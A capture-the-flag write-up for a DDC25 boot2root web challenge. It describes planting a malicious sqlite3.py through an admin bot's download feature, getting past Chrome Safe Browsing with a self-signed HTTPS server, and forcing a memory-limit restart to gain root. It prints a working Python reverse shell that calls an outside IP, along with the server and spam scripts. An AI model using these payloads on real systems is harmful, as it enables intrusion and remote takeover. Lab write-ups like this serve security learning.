---
title: Film til dig Pt. 2 🎬
date: 2025-03-16 12:52 +/-TTTT
categories: [CTF Writeups, DDC25]
tags: [DDC, Boot2Root, Web Exploitation]     # TAG names should always be lowercase
media_subpath: /assets/img/FilmTilDig
---

{: .prompt-info } 
> This challenge is a continuation of the previous challenge [Film til dig Pt. 1 🍿]({% post_url 2025-03-16-Film til dig 1%})

## 🧪 Experimental admin powers

The second part of the challenge doesn't have a description. But looking in the Dockerfile, we can see that the second flag is located in the `/root` directory.
```Dockerfile
RUN sh -c "echo 'DDC{flag2}' > /root/$(openssl rand -hex 12).txt"
```
{: .nolineno }
This means we need to escalate from the admin user, to full root access on the machine.
Let's look at the source code again. Now that we are admin, we can access some new functionality:
- We can impersonate users.
- We can delete reviews.
- We can enable experimental features.

The impersonate feature is odd, it sets our session to any user we want. But looking deeper in the source, the impersonate feature takes two parameters: The user and an optional redirect url. The redirect url is used to redirect the user after impersonating. 
```js
document.addEventListener('DOMContentLoaded', function() {
    const urlParams = new URLSearchParams(window.location.search);
    const redirectTo = urlParams.get('redirect_to') ? decodeURIComponent(urlParams.get('redirect_to')) : '/movies';
    setTimeout(() => {
        window.location.replace(redirectTo);
    }, 2000);
});
```
{: .nolineno }
{: file="src/templates/impersonate.html" }
This would give us the ability to visit any url with the admin bot, skipping the same domain check. But this isn't all that useful on its own. Let's look at the experimental features. These only impact the headless browser bot:
```python
options = Options()
options.add_argument('--headless')
options.add_argument('--disable-extensions')
options.add_argument('--disable-gpu')
options.add_argument('--no-sandbox')
options.add_argument('--disable-software-rasterizer')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--js-flags=--noexpose_wasm,--jitless')

if experimental:
    prefs = {
        "download.default_directory": os.getcwd(),
        "safebrowsing.enabled": "true"
    }
    options.add_experimental_option("prefs", prefs)
    options.add_argument('--ignore-certificate-errors')

driver = webdriver.Chrome(options=options)
```
{: .nolineno }
{: file="src/bot.py" }
Enabling experimental features gives us the ability to download files into the current working directory. We can potentially use this to serve our own malicious file for download, and have the bot place it in the working directory on the server.
This could be used to perform a LFI attack (Local file inclusion). The `app.py` script imports a bunch of libraries, such as flask, sqlite3, etc. If we can make the bot download a malicious file called `sqlite3.py` it would in theory be imported instead of the real `sqlite3` library, which would give us code execution.

## 💾 The memory limit

The entire website is run in a docker container, using the `supervisord` service. Looking at the `supervisord.conf` file, we can see that a memory limit is set for the container:
```conf
[eventlistener:memmon]
command=memmon -c -a 250MB
events=TICK_60
```
{: .nolineno }
{: file="supervisord.conf" }
This means that the container will be killed and restarted if it exceeds 250MB of memory usage. The server checks this memory limit every 60 seconds. 
So combining these two attacks we could potentially have Flask load a malicious module after restarting it with a memory overload.
But how do we overload the memory?
If we again look at the `bot.py` script, we can see that the experimental features also unlock something else:

```python
if experimental:
    p_element = driver.find_elements(By.TAG_NAME, 'p')
    text = ''
    for element in p_element:
        text += element.text
        reported_reviews.append(element.text)
```
{: .nolineno }
{: file="src/bot.py" }

We can make the bot append data in memory. Knowing this, we can make the bot visit and save a bunch of data in memory, eventually hitting the limit and restarting the server.

## 👾 Malicious downloads

But first we need to make it download our malicious python module. I create a quick Python reverse shell from [revshells.com](https://www.revshells.com/) and name it `sqlite3.py`. 

```python
import os,pty,socket;s=socket.socket();s.connect(("10.0.240.251",4242));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```
{: .nolineno }
{: file="sqlite3.py" }

I then host it on a simple http server, using Flask, and make sure the `Content-Disposition` header is set to `attachment`, which forces the browser to download the file instead of displaying it.

This does however not work! The bot is unable to download the file. Why? 🤔
Looking at our Flask server logs, we can see that the bot is requesting the file, but the file is never downloaded.

The browser is headless and we can't see what is going on. But since we have the source code, we can spin up our own local version of the challenge. This also allows us to easily debug the bot. We can remove the headless option, and see what is actually happening in the browser.

![Bot downloading the file](ChromeInsecureDownload.png)

Chrome is blocking our download... 😠

## 🤨 Unsafe Safe Browsing

Let's look at the source again:
```python
if experimental:
    prefs = {
        "download.default_directory": os.getcwd(),
        "safebrowsing.enabled": "true" # <-- This ruins our day :(
    }
    options.add_experimental_option("prefs", prefs)
    options.add_argument('--ignore-certificate-errors')
```
{: .nolineno }
{: file="src/bot.py" }

While the download directory is set to the current working directory, Safe Browsing is also enabled.
This means that the bot will not download any files that are considered dangerous. This includes any executable files, such as `.py` files. It does successfully download `.txt` files, but that doesn't help us at all. 

Looking at the [Safe Browsing documentation](https://support.google.com/chrome/answer/6261569?sjid=9685798359344154749-EU){:target="_blank"}, it seems that executable file downloads are only blocked on non-HTTPS domains. Meaning that if we can host the malicious file on an HTTPS domain, we can bypass the Safe Browsing feature.
While trying this, I remembered that the entire challenge does not have access to the internet, and therefore can't lookup DNS records for a domain. And we also can't get a CA signed certificate for an IP address.

This seemingly renders the entire attack useless! Or does it??? 🤯

Look at the source again: `options.add_argument('--ignore-certificate-errors')`

We don't even need a valid signed certificate! We can just serve the file over our local IP with our own self-signed certificate.
We can quickly generate a self-signed certificate with OpenSSL:
```bash
$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
```
{: .nolineno }

And modify the Flask server to use our certificate:

```python
from flask import Flask, send_file
import os

app = Flask(__name__)

@app.route("/")
@app.route("/<path:path>")  # Match any path
def download_file(path=""):
    file_path = os.path.join(os.getcwd(), "sqlite3.py")
    return send_file(
        file_path,
        as_attachment=True, # <-- Sets the Content-Disposition header, and forces download
        download_name="sqlite3.py",
        mimetype="text/x-python"
    )

app.run(
    host="0.0.0.0", 
    port=8001, 
    debug=True, 
    ssl_context=('cert.pem', 'key.pem') # <-- Use our certificate
)
```
{: .nolineno }
{: file="localserver.py" }

Now Chrome has an HTTPS connection to our local server. The invalid certificate is ignored, and the file is downloaded successfully.

![Bot downloading the file](SuccessDownload.png)

Yippee! 🎉🎉🎉

## 🚀 Memory overload & reverse shell

Now the last step is crashing and restarting the server. I created a simple Python script that made the bot visit the biggest file on the server: `tailwind.css`. We could potentially also just host a giant file ourselves, but this is easier. 

So we setup a reverse shell listener on our local machine:
```bash
$ nc -l 4242
```
{: .nolineno }

And run the spam script:

```python
def make_request():
    url = f"http://{SERVER_IP}:{PORT}/api/report_review"
    cookies = {"session": ADMIN_SESSION}
    json_data={"review_url": "/static/tailwind.css"}
    try:
        return requests.post(url, headers=headers, cookies=cookies, json=json_data)
    except:
        return "Request failed"

while True:
    print(make_request())
```
{: .nolineno }
{: file="overload.py" }

After about 60 seconds, the memory overflows the limit and the server restarts. Upon starting `app.py` it checks for `sqlite3.py`. Since Python always checks the current working directory first, it will import our malicious module instead of the real `sqlite3` library. And we get a reverse shell as root.

```console
$ nc -l 4242
# whoami
root
```

The flag is located in the `/root` directory, and we can read it with `cat /root/*.txt`.

```console
# ls
__pycache__  bot.py  movies.db         sqlite3.py  templates
app.py       db.py   requirements.txt  static      utils.py
# cat /root/*.txt
DDC{0dd_3xp3r1m3nt4l_b3hav1o8888ur???_0xlimE_g0n3_b3_m4444d...}
```
🚩Woop woop!🚩

And that's it! Notice how our malicious `sqlite3.py` file is in the working directory, and was loaded during startup.

## 🤓 TL;DR

1. The flag is in `/root` directory, requiring root access.
2. We discovered the admin bot allows us to download files with experimental features enabled.
3. By creating a malicious `sqlite3.py` file and hosting it over HTTPS with self-signed certificates, we bypassed Chrome's Safe Browsing.
4. We exploited the server's memory limits by spamming requests to load large files.
5. When the server restarted due to memory overload, it imported our malicious module, giving us a root shell.
6. We grabbed the flag from `/root/*.txt`